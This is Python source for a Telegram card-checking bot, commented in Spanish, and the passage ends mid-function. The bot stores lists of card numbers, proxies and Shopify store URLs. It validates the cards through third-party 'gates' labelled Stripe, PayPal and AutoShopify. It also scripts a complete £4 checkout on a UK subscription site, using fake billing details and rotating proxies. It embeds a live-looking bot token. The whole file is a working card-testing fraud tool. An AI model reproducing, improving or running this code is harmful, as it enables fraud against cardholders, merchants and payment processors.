#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
BOT PRINCIPAL - AUTO SHOPIFY BOT
Gates: Stripe $1 No AVS, PayPal, AutoShopify, iSubscribe UK (£4)
"""

import telebot
from telebot import types
import requests
import sqlite3
import json
import time
import os
import re
import random
from datetime import datetime
from threading import Thread, Lock
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import socket
import html

# ==================== CONFIGURACIÓN ====================
TOKEN = '8503937259:AAEApOgsbu34qw5J6OKz1dxgvRzrFv9IQdE'
bot = telebot.TeleBot(TOKEN)

# Variable global para el proxy
proxy_actual = None

# Lock para operaciones de base de datos
db_lock = Lock()

# Cola de tareas masivas
active_tasks = {}

# ==================== FUNCIONES DE BASE DE DATOS ====================

def get_db_connection():
    """Crea una nueva conexión a la base de datos"""
    conn = sqlite3.connect('proxies.db', timeout=10)
    conn.row_factory = sqlite3.Row
    return conn

def init_database():
    """Inicializa la base de datos con todas las tablas necesarias"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Tabla de proxies
    cursor.execute('''CREATE TABLE IF NOT EXISTS proxies (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        proxy TEXT UNIQUE,
        fecha TEXT,
        successes INTEGER DEFAULT 0,
        failures INTEGER DEFAULT 0,
        last_used TEXT,
        last_test TEXT,
        status TEXT DEFAULT 'untested'
    )''')
    
    # Tabla de historial
    cursor.execute('''CREATE TABLE IF NOT EXISTS historial (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        cc TEXT,
        proxy TEXT,
        gate TEXT,
        amount TEXT,
        status TEXT,
        message TEXT,
        gates TEXT,
        bin_info TEXT,
        fecha TEXT
    )''')
    
    # Tabla de tarjetas
    cursor.execute('''CREATE TABLE IF NOT EXISTS tarjetas (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        cc TEXT UNIQUE,
        fecha TEXT,
        veces_verificada INTEGER DEFAULT 0
    )''')
    
    # Tabla para sitios Shopify
    cursor.execute('''CREATE TABLE IF NOT EXISTS sitios (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        url TEXT UNIQUE,
        fecha TEXT,
        successes INTEGER DEFAULT 0,
        failures INTEGER DEFAULT 0,
        last_used TEXT
    )''')
    
    # Agregar columnas si no existen
    try:
        cursor.execute("ALTER TABLE proxies ADD COLUMN last_test TEXT")
        cursor.execute("ALTER TABLE proxies ADD COLUMN status TEXT DEFAULT 'untested'")
    except:
        pass
    
    try:
        cursor.execute("ALTER TABLE historial ADD COLUMN gate TEXT")
        cursor.execute("ALTER TABLE historial ADD COLUMN amount TEXT")
    except:
        pass
    
    try:
        cursor.execute("ALTER TABLE historial ADD COLUMN bin_info TEXT")
    except:
        pass
    
    conn.commit()
    conn.close()
    print("✅ Base de datos configurada correctamente")

# Inicializar BD
init_database()

# ==================== FUNCIONES DE PROXIES ====================

def guardar_proxy(proxy):
    """Guarda un proxy en la base de datos"""
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("INSERT INTO proxies (proxy, fecha) VALUES (?, ?)", 
                      (proxy, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        return True
    except Exception as e:
        print(f"Error guardando proxy: {e}")
        return False
    finally:
        if conn:
            conn.close()

def guardar_proxies_desde_texto(texto):
    """Guarda proxies desde un archivo de texto"""
    lineas = texto.strip().split('\n')
    guardados = 0
    repetidos = 0
    invalidos = 0
    
    # Patrón para identificar proxies (ip:puerto o ip:puerto:user:pass)
    patron_proxy = re.compile(r'^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)(?::([^:]+):([^:]+))?$')
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    for linea in lineas:
        linea = linea.strip()
        if not linea:
            continue
        
        # Verificar si es un proxy válido
        if patron_proxy.match(linea):
            try:
                cursor.execute("INSERT INTO proxies (proxy, fecha) VALUES (?, ?)",
                              (linea, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                conn.commit()
                guardados += 1
            except:
                repetidos += 1
        else:
            invalidos += 1
    
    conn.close()
    return guardados, repetidos, invalidos

def obtener_proxies():
    """Obtiene todos los proxies"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT proxy FROM proxies")
    proxies = [row[0] for row in cursor.fetchall()]
    conn.close()
    return proxies

def obtener_proxies_con_estadisticas():
    """Obtiene proxies con sus estadísticas"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT proxy, successes, failures, last_test, status FROM proxies ORDER BY successes DESC, failures ASC")
    resultados = cursor.fetchall()
    conn.close()
    return resultados

def eliminar_proxy(proxy):
    """Elimina un proxy específico"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM proxies WHERE proxy = ?", (proxy,))
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas > 0

def eliminar_todos_proxies():
    """Elimina TODOS los proxies de la base de datos"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM proxies")
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas

def eliminar_proxies_muertos():
    """Elimina todos los proxies marcados como 'dead'"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM proxies WHERE status = 'dead'")
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas

def actualizar_estadisticas_proxy(proxy, success):
    """Actualiza estadísticas de un proxy"""
    conn = get_db_connection()
    cursor = conn.cursor()
    campo = "successes" if success else "failures"
    cursor.execute(f"UPDATE proxies SET {campo} = {campo} + 1, last_used = ? WHERE proxy = ?", 
                  (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), proxy))
    conn.commit()
    conn.close()

def actualizar_status_proxy(proxy, status, tiempo):
    """Actualiza el status del proxy después del test"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("UPDATE proxies SET status = ?, last_test = ? WHERE proxy = ?",
                  (status, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), proxy))
    conn.commit()
    conn.close()

# ==================== FUNCIONES PARA SITIOS SHOPIFY ====================

def guardar_sitio(url):
    """Guarda un sitio Shopify en la base de datos"""
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("INSERT INTO sitios (url, fecha) VALUES (?, ?)", 
                      (url, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        return True
    except Exception as e:
        print(f"Error guardando sitio: {e}")
        return False
    finally:
        if conn:
            conn.close()

def guardar_sitios_desde_texto(texto):
    """Guarda sitios desde un archivo de texto"""
    lineas = texto.strip().split('\n')
    guardados = 0
    repetidos = 0
    invalidos = 0
    
    # Patrón para identificar URLs de Shopify
    patron_url = re.compile(r'^https?://[a-zA-Z0-9-]+\.myshopify\.com/?$')
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    for linea in lineas:
        linea = linea.strip()
        if not linea:
            continue
        
        # Verificar si es una URL válida de Shopify
        if patron_url.match(linea):
            try:
                cursor.execute("INSERT INTO sitios (url, fecha) VALUES (?, ?)",
                              (linea, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                conn.commit()
                guardados += 1
            except:
                repetidos += 1
        else:
            invalidos += 1
    
    conn.close()
    return guardados, repetidos, invalidos

def obtener_sitios():
    """Obtiene todos los sitios Shopify"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT url FROM sitios")
    sitios = [row[0] for row in cursor.fetchall()]
    conn.close()
    return sitios

def obtener_sitios_con_estadisticas():
    """Obtiene sitios con sus estadísticas"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT url, successes, failures, last_used FROM sitios ORDER BY successes DESC, failures ASC")
    resultados = cursor.fetchall()
    conn.close()
    return resultados

def eliminar_sitio(url):
    """Elimina un sitio específico"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM sitios WHERE url = ?", (url,))
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas > 0

def eliminar_todos_sitios():
    """Elimina TODOS los sitios de la base de datos"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM sitios")
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas

def actualizar_estadisticas_sitio(url, success):
    """Actualiza estadísticas de un sitio"""
    conn = get_db_connection()
    cursor = conn.cursor()
    campo = "successes" if success else "failures"
    cursor.execute(f"UPDATE sitios SET {campo} = {campo} + 1, last_used = ? WHERE url = ?", 
                  (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), url))
    conn.commit()
    conn.close()

# ==================== LIMPIEZA AUTOMÁTICA DE SITIOS ====================

def limpiar_sitios_muertos():
    """
    Elimina automáticamente los sitios que devuelven errores como 'py id empty'
    """
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute("SELECT id, url, failures FROM sitios")
    sitios = cursor.fetchall()
    
    eliminados = 0
    for sitio in sitios:
        sitio_id = sitio['id']
        url = sitio['url']
        failures = sitio['failures']
        
        try:
            cc_prueba = "4242424242424242|12|25|123"
            resultado = verificar_api_autoshopify(cc_prueba, url)
            
            respuestas_muertas = ['py id empty', '404', 'not found', 'connection refused']
            mensaje = resultado.get('message', '').lower()
            
            if any(rm in mensaje for rm in respuestas_muertas):
                cursor.execute("DELETE FROM sitios WHERE id = ?", (sitio_id,))
                eliminados += 1
                print(f"🗑️ Sitio eliminado: {url}")
            
            elif failures >= 10:
                cursor.execute("DELETE FROM sitios WHERE id = ?", (sitio_id,))
                eliminados += 1
                print(f"🗑️ Sitio eliminado por muchos fallos: {url}")
            
        except Exception as e:
            cursor.execute("DELETE FROM sitios WHERE id = ?", (sitio_id,))
            eliminados += 1
            print(f"🗑️ Sitio eliminado por excepción: {url}")
    
    conn.commit()
    conn.close()
    return eliminados

def limpiar_sitios_programado():
    while True:
        time.sleep(3600)
        try:
            eliminados = limpiar_sitios_muertos()
            if eliminados > 0:
                print(f"🧹 Limpieza automática: {eliminados} sitios eliminados")
        except Exception as e:
            print(f"❌ Error en limpieza programada: {e}")

# Iniciar el hilo de limpieza automática
limpieza_thread = Thread(target=limpiar_sitios_programado, daemon=True)
limpieza_thread.start()

# ==================== FUNCIONES DE TARJETAS ====================

def guardar_tarjetas_desde_texto(texto):
    """Guarda tarjetas desde un archivo de texto"""
    lineas = texto.strip().split('\n')
    guardadas = 0
    repetidas = 0
    invalidas = 0
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    for linea in lineas:
        linea = linea.strip()
        if not linea:
            continue
        partes = linea.split('|')
        if len(partes) == 4:
            try:
                cursor.execute("INSERT INTO tarjetas (cc, fecha) VALUES (?, ?)",
                              (linea, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                conn.commit()
                guardadas += 1
            except:
                repetidas += 1
        else:
            invalidas += 1
    
    conn.close()
    return guardadas, repetidas, invalidas

def obtener_todas_tarjetas():
    """Obtiene todas las tarjetas"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT cc, fecha, veces_verificada FROM tarjetas ORDER BY fecha DESC")
    resultados = cursor.fetchall()
    conn.close()
    return resultados

def aumentar_contador_tarjeta(cc):
    """Aumenta el contador de verificaciones de una tarjeta"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("UPDATE tarjetas SET veces_verificada = veces_verificada + 1 WHERE cc = ?",
                  (cc,))
    conn.commit()
    conn.close()

def eliminar_tarjeta(cc):
    """Elimina una tarjeta específica"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM tarjetas WHERE cc = ?", (cc,))
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas > 0

def eliminar_todas_tarjetas():
    """Elimina TODAS las tarjetas"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM tarjetas")
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas

def guardar_historial(cc, proxy, gate, amount, status, message, gates, bin_info):
    """Guarda una verificación en el historial"""
    if isinstance(bin_info, dict):
        bin_info_str = json.dumps(bin_info)
    else:
        bin_info_str = bin_info
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute("INSERT INTO historial (cc, proxy, gate, amount, status, message, gates, bin_info, fecha) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                  (cc, proxy, gate, amount, status, message, gates, bin_info_str, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit()
    conn.close()
    
    if proxy != 'gestionado':
        actualizar_estadisticas_proxy(proxy, status == 'success')
    
    aumentar_contador_tarjeta(cc)

def obtener_estadisticas():
    """Obtiene estadísticas globales"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute("SELECT COUNT(*), SUM(successes), SUM(failures) FROM proxies")
    stats_proxies = cursor.fetchone()
    
    cursor.execute("SELECT COUNT(*), SUM(successes), SUM(failures) FROM sitios")
    stats_sitios = cursor.fetchone()
    
    cursor.execute("SELECT COUNT(*) FROM tarjetas")
    total_tarjetas = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM historial")
    total_checks = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM historial WHERE status='success'")
    total_success = cursor.fetchone()[0]
    
    conn.close()
    
    return {
        'proxies': stats_proxies[0] or 0,
        'exits_proxy': stats_proxies[1] or 0,
        'fallos_proxy': stats_proxies[2] or 0,
        'sitios': stats_sitios[0] or 0,
        'exits_sitio': stats_sitios[1] or 0,
        'fallos_sitio': stats_sitios[2] or 0,
        'tarjetas': total_tarjetas or 0,
        'checks': total_checks or 0,
        'aprobadas': total_success or 0
    }

# ==================== FUNCIÓN DE CONSULTA BIN ====================

def consultar_bin(bin_number):
    """
    Consulta información de BIN usando binlist.net
    """
    try:
        bin_number = bin_number[:6]
        
        url = f"https://lookup.binlist.net/{bin_number}"
        headers = {
            'Accept-Version': '3',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        response = requests.get(url, headers=headers, timeout=5)
        
        if response.status_code == 200:
            return response.json()
        elif response.status_code == 404:
            return {"error": "BIN no encontrado", "bin": bin_number}
        elif response.status_code == 429:
            return {"error": "Límite de peticiones excedido", "bin": bin_number}
        else:
            return {"error": f"Error {response.status_code}", "bin": bin_number}
            
    except Exception as e:
        return {"error": str(e), "bin": bin_number}

# ==================== FUNCIÓN AUXILIAR CAPTURE ====================

def capture(text, start_str, end_str):
    """Extrae texto entre dos marcadores"""
    try:
        start = text.find(start_str)
        if start == -1:
            return ""
        start += len(start_str)
        end = text.find(end_str, start)
        if end == -1:
            return ""
        return text[start:end].strip()
    except:
        return ""

# ==================== FUNCIÓN DE VERIFICACIÓN STRIPE $1 NO AVS ====================

def verificar_api_stripe_noavs(cc, proxy=None):
    """
    Verifica usando Stripe $1.00 No AVS (endpoint /api/check5)
    """
    try:
        api_url = f"https://samurai-api-hub.up.railway.app/api/check5?c={cc}"
        if proxy:
            api_url += f"&p={proxy}"
        
        start_time = time.time()
        response = requests.get(api_url, timeout=30)
        elapsed = time.time() - start_time
        
        try:
            data = response.json()
            status = data.get('status', 'unknown')
            message = data.get('message', 'Sin mensaje')
            gates = data.get('gates', 'stripe 1.00$ charged (No AVS)')
            amount = data.get('amount', '1.00')
            
            return {
                'success': status == 'success',
                'status': status,
                'message': message,
                'gates': gates,
                'gate_name': 'Stripe $1 No AVS',
                'amount': amount,
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
        except json.JSONDecodeError:
            return {
                'success': False,
                'status': 'error',
                'message': f'HTTP {response.status_code}',
                'gates': 'stripe error',
                'gate_name': 'Stripe $1 No AVS',
                'amount': '1.00',
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': str(e),
            'gates': 'stripe error',
            'gate_name': 'Stripe $1 No AVS',
            'amount': '1.00',
            'proxy': proxy if proxy else 'gestionado',
            'tiempo': 30
        }

# ==================== FUNCIONES DE VERIFICACIÓN PAYPAL ====================

def verificar_api_paypal(cc, gate=1, proxy=None):
    """
    Verifica usando PayPal con diferentes montos
    gate 1: /pp/check  - $10.00
    gate 2: /pp/check2 - $0.10
    gate 3: /pp/check3 - $1.00
    """
    gates = {
        1: {"endpoint": "/pp/check", "amount": "10.00", "name": "PayPal $10"},
        2: {"endpoint": "/pp/check2", "amount": "0.10", "name": "PayPal $0.10"},
        3: {"endpoint": "/pp/check3", "amount": "1.00", "name": "PayPal $1"}
    }
    
    gate_info = gates.get(gate, gates[1])
    
    try:
        api_url = f"https://samurai-api-hub.up.railway.app{gate_info['endpoint']}?c={cc}"
        if proxy:
            api_url += f"&p={proxy}"
        
        start_time = time.time()
        response = requests.get(api_url, timeout=30)
        elapsed = time.time() - start_time
        
        try:
            data = response.json()
            status = data.get('status', 'unknown')
            message = data.get('message', 'Sin mensaje')
            gates_str = f"paypal {gate_info['amount']}$ charged"
            
            return {
                'success': status == 'success',
                'status': status,
                'message': message,
                'gates': gates_str,
                'gate_name': gate_info['name'],
                'amount': gate_info['amount'],
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
        except json.JSONDecodeError:
            return {
                'success': False,
                'status': 'error',
                'message': f'HTTP {response.status_code}',
                'gates': 'paypal error',
                'gate_name': gate_info['name'],
                'amount': gate_info['amount'],
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': str(e),
            'gates': 'paypal error',
            'gate_name': gate_info['name'],
            'amount': gate_info['amount'],
            'proxy': proxy if proxy else 'gestionado',
            'tiempo': 30
        }

# ==================== FUNCIÓN DE VERIFICACIÓN AUTOSHOPIFY ====================

def verificar_api_autoshopify(cc, url, proxy=None):
    """
    Verifica usando AutoShopify API
    """
    try:
        api_url = f"https://auto-shopify-api-production.up.railway.app/index.php?site={url}&cc={cc}"
        
        if proxy:
            api_url += f"&proxy={proxy}"
        
        start_time = time.time()
        response = requests.get(api_url, timeout=30)
        elapsed = time.time() - start_time
        
        try:
            data = response.json()
            response_text = data.get('Response', 'Unknown')
            price = data.get('Price', '0.00')
            
            is_success = 'Order completed' in response_text or 'success' in response_text.lower()
            
            return {
                'success': is_success,
                'status': 'success' if is_success else 'failed',
                'message': response_text,
                'gates': f"Shopify ${price}",
                'gate_name': f"AutoShopify ${price}",
                'amount': price,
                'url': url,
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
        except json.JSONDecodeError:
            return {
                'success': False,
                'status': 'error',
                'message': f'HTTP {response.status_code} - {response.text[:100]}',
                'gates': 'shopify error',
                'gate_name': 'AutoShopify',
                'amount': '0.00',
                'url': url,
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': str(e),
            'gates': 'shopify error',
            'gate_name': 'AutoShopify',
            'amount': '0.00',
            'url': url,
            'proxy': proxy if proxy else 'gestionado',
            'tiempo': 30
        }

# ==================== NUEVO GATEWAY: iSubscribe UK (£4.00) ====================

def verificar_isubscribe(cc, proxy=None):
    """
    Verifica tarjeta comprando una suscripción en iSubscribe UK
    Monto: £4.00 GBP (~$4.00 USD)
    """
    start_time = time.time()
    session = requests.Session()
    
    # Configurar proxy si se proporciona
    if proxy:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            ip, puerto, user, pwd = proxy_parts
            proxy_url = f'http://{user}:{pwd}@{ip}:{puerto}'
            session.proxies = {'http': proxy_url, 'https': proxy_url}
            proxy_used = proxy
        else:
            session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            proxy_used = proxy
    else:
        proxy_used = "gestionado"
    
    try:
        # Parsear tarjeta
        partes = cc.split('|')
        if len(partes) != 4:
            return {
                'success': False,
                'status': 'error',
                'message': 'Formato inválido',
                'gate_name': 'iSubscribe UK £4',
                'amount': '4.00',
                'proxy': proxy_used,
                'tiempo': round(time.time() - start_time, 2)
            }

        numero, mes, año, cvv = partes
        
        # Formatear mes y año
        if len(mes) == 1:
            mes = f'0{mes}'
        if len(año) == 2:
            año_full = f'20{año}'
            año_short = año
        else:
            año_full = año
            año_short = año[-2:]

        # Headers por defecto
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }

        # Determinar tipo de tarjeta
        if numero.startswith('3'):
            card_type = "AMEX"
        elif numero.startswith('4'):
            card_type = "VISA"
        elif numero.startswith('5'):
            card_type = "Mastercard"
        else:
            card_type = "VISA"

        # PASO 1: Obtener página del producto
        r = session.get("https://www.isubscribe.co.uk/She-Kicks-Magazine-Subscription.cfm", 
                       headers=headers, timeout=15)
        
        if r.status_code != 200:
            return {
                'success': False,
                'status': 'error',
                'message': f'Error HTTP {r.status_code}',
                'gate_name': 'iSubscribe UK £4',
                'amount': '4.00',
                'proxy': proxy_used,
                'tiempo': round(time.time() - start_time, 2)
            }
        
        # Extraer IDs del producto
        pi = capture(r.text, "prodId=", "&amp")
        ps = capture(r.text, "prodSubId=", "&amp")
        
        # PASO 2: Añadir al carrito
        session.get(f"https://www.isubscribe.co.uk/cart.cfm?action=add&prodId={pi}&prodSubId={ps}&qty=1", 
                   headers=headers, timeout=10)
        
        # PASO 3: Configurar datos de facturación
        email = f"test{random.randint(1000,9999)}@gmail.com"
        
        data_billing = (
            f"itemcount=1&guestcheckout=true&userid=&email={email}"
            f"&title=Mr.&firstname=John&lastname=Doe&phone=1234567890"
            f"&company=&street=1+Warwick+Road&suburb=Thames+Ditton"
            f"&postcode=KT7+0PR&state=&otherstate=&country=United+Kingdom"
            f"&prodsubid_1={ps}&prodtitle_1=She+Kicks+Magazine"
            f"&emaildelivery_1=0&isdigital_1=0&isgiftvoucher_1=0"
            f"&xmas_start_1=0&renewal_1=0&gift_1=0&senderfirstname_1=+"
            f"&email_1=&message_1=&senddate_1=18%2F10%2F2023&address_1=billing"
            f"&title_1=Mr.&firstname_1=John&lastname_1=Doe&company_1="
            f"&street_1=1+Warwick+Road&suburb_1=Thames+Ditton"
            f"&postcode_1=KT7+0PR&state_1=United+Kingfonm"
            f"&country_1=United+Kingdom&publisher_post=0&organisations_post=0"
            f"&isubscribe_terms=1"
        )
        
        headers_billing = headers.copy()
        headers_billing['Content-Type'] = 'application/x-www-form-urlencoded'
        
        session.post(
            "https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&mode=admin&action=setbilling&formmode=new&ajax=true",
            headers=headers_billing,
            data=data_billing,
            timeout=15
        )
        
        # PASO 4: Seleccionar método de pago
        session.post(
            "https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&mode=admin&action=setpayment&formmode=new&ajax=true",
            headers=headers_billing,
            data=f"paymentMethod=creditcard&walletToken=&card={card_type}",
            timeout=15
        )
        
        # PASO 5: Obtener página de confirmación
        r = session.get("https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&step=confirm", 
                       headers=headers, timeout=15)
        
        # Extraer tokens
        ft = capture(r.text, "fzToken = '", "'")
        ve = capture(r.text, '"verification" value="', '"')
        am = capture(r.text, "amount: ", ",")
        
        # PASO 6: Obtener CSRF token
        r = session.get("https://paynow.pmnts.io/sdk/bridge", headers=headers, timeout=15)
        cs = capture(r.text, "'X-CSRF-Token': \"", "\"")
        
        # PASO 7: Enviar datos de tarjeta
        headers_card = {
            "x-csrf-token": cs,
            "authorization": f"Bearer {ft}",
            "content-type": "application/json",
        }
        
        data_card = {
            "card_holder": "John Doe",
            "card_number": numero,
            "card_expiry": f"{mes}/{año_short}",
            "cvv": cvv,
        }
        
        r = session.post("https://paynow.pmnts.io/sdk/credit_cards", 
                        headers=headers_card, json=data_card, timeout=15)
        
        # PASO 8: Crear sesión SCA
        headers_sca = {
            "fz-merchant-username": "isubscribeunitedkingdom",
            "authorization": f"Bearer {ft}",
            "content-type": "application/json",
        }
        
        monto_int = int(am) if am and am.isdigit() else 400
        r = session.post("https://api.pmnts.io/sca/session", 
                        headers=headers_sca, 
                        json={"amount": monto_int, "currency": "GBP"},
                        timeout=15)
        
        # PASO 9: Procesar pago
        data_payment = (
            f"return_path=https%3A%2F%2Fwww.isubscribe.co.uk%2Fssl%2Fcheckout%2Findex.cfm%3Fview%3Dnew%26step%3Dconfirm%26mode%3Dadmin%26action%3DplaceOrder%26source%3Dconfirm"
            f"&verification={ve}&card_type={card_type}&card_number={numero}"
            f"&card_holder=John+Doe&expiry_month={mes}&expiry_year={año_short}"
            f"&cvv={cvv}"
        )
        
        r = session.post(
            "https://gateway.pmnts.io/v2/credit_cards/direct/isubscribeunitedkingdom",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=data_payment,
            timeout=15,
            allow_redirects=False
        )
        
        # PASO 10: Verificar resultado
        r = session.get(
            "https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=returning&step=confirm&formmode=edit&source=confirm&error=true&errorno=05",
            headers=headers,
            timeout=15
        )
        
        # Extraer mensaje de error
        msg1 = capture(r.text, '<div class="alert alert-danger alert-dismissable" id="', '">')
        msg2 = ""
        if msg1:
            msg2 = capture(r.text, f'<div class="alert alert-danger alert-dismissable" id="{msg1}">', "<br>")
        
        message = html.unescape(msg2) if msg2 else ""
        message = re.sub(r'<[^>]+>', '', message)
        
        elapsed_time = time.time() - start_time
        
        # Determinar resultado
        if r.status_code == 302:
            status = "success"
            msg = "✅ CARGO EXITOSO de £4.00 GBP"
            success = True
        elif "insufficient funds" in message.lower():
            status = "success"
            msg = "⚠️ Fondos insuficientes (tarjeta válida)"
            success = True
        else:
            status = "failed"
            msg = message if message else "❌ Tarjeta declinada"
            success = False
        
        return {
            'success': success,
            'status': status,
            'message': msg,
            'gate_name': 'iSubscribe UK £4',
            'amount': '4.00',
            'proxy': proxy_used,
            'tiempo': round(elapsed_time, 2)
        }
        
    except requests.exceptions.Timeout:
        return {
            'success': False,
            'status': 'error',
            'message': 'Timeout de conexión',
            'gate_name': 'iSubscribe UK £4',
            'amount': '4.00',
            'proxy': proxy_used,
            'tiempo': round(time.time() - start_time, 2)
        }
    except requests.exceptions.ConnectionError:
        return {
            'success': False,
            'status': 'error',
            'message': 'Error de conexión',
            'gate_name': 'iSubscribe UK £4',
            'amount': '4.00',
            'proxy': proxy_used,
            'tiempo': round(time.time() - start_time, 2)
        }
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': str(e)[:100],
            'gate_name': 'iSubscribe UK £4',
            'amount': '4.00',
            'proxy': proxy_used,
            'tiempo': round(time.time() - start_time, 2)
        }

# ==================== FORMATO PREMIUM PARA RESULTADOS ====================

def formato_check_premium(cc, resultado_api, bin_info, tiempo, user_name="User", gate_type="Stripe"):
    """
    Formato premium con diseño tipo checker profesional
    """
    # Determinar estado de la verificación
    if resultado_api['status'] == 'success':
        estado_verif = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅"
        color_estado = "✅"
    elif resultado_api['status'] == 'failed':
        estado_verif = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
        color_estado = "❌"
    elif resultado_api['status'] == 'error':
        estado_verif = "𝐄𝐫𝐫𝐨𝐫 ⚠️"
        color_estado = "⚠️"
    else:
        estado_verif = "𝐔𝐧𝐤𝐧𝐨𝐰𝐧 ❓"
        color_estado = "❓"
    
    # Extraer datos de la tarjeta
    partes = cc.split('|')
    numero = partes[0]
    mes = partes[1]
    año = partes[2]
    cvv = partes[3]
    bin_num = numero[:6]
    
    # Extraer información del BIN
    if bin_info and isinstance(bin_info, dict) and 'error' not in bin_info:
        scheme = bin_info.get('scheme', 'UNKNOWN').upper()
        card_type = bin_info.get('type', 'UNKNOWN').upper()
        
        # Datos del país
        country_info = bin_info.get('country', {})
        country_name = country_info.get('name', 'Unknown')
        country_emoji = country_info.get('emoji', '🌍')
        
        # Datos del banco
        bank_info = bin_info.get('bank', {})
        bank_name = bank_info.get('name', 'Unknown')
        
        # Determinar tipo de tarjeta completo
        if scheme == "VISA":
            tipo_completo = "VISA"
        elif scheme == "MASTERCARD":
            tipo_completo = "MASTERCARD"
        elif scheme == "AMEX":
            tipo_completo = "AMERICAN EXPRESS"
        elif scheme == "DISCOVER":
            tipo_completo = "DISCOVER"
        elif scheme == "JCB":
            tipo_completo = "JCB"
        else:
            tipo_completo = scheme
        
        # Tipo específico (debit/credit)
        tipo_especifico = card_type.capitalize() if card_type else "UNKNOWN"
        
        # Información de país formateada
        country_line = f"{country_name} {country_emoji}"
    else:
        tipo_completo = "UNKNOWN"
        tipo_especifico = "UNKNOWN"
        country_line = "Unknown 🌍"
        bank_name = "Unknown"
    
    # Status del proxy
    if resultado_api['proxy'] == 'gestionado':
        proxy_status = "API 🌐"
    else:
        proxy_status = "Live ✨"
    
    # Formatear tiempo
    if tiempo < 60:
        tiempo_str = f"{tiempo:.2f}s"
    else:
        minutos = int(tiempo // 60)
        segundos = int(tiempo % 60)
        tiempo_str = f"{minutos}m {segundos}s"
    
    # Limpiar mensaje de estado
    status_msg = resultado_api['message']
    
    # Construir el mensaje premium
    texto = f"""
{color_estado} {estado_verif}
━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝗖𝗖 : {numero}|{mes}|{año}|{cvv}
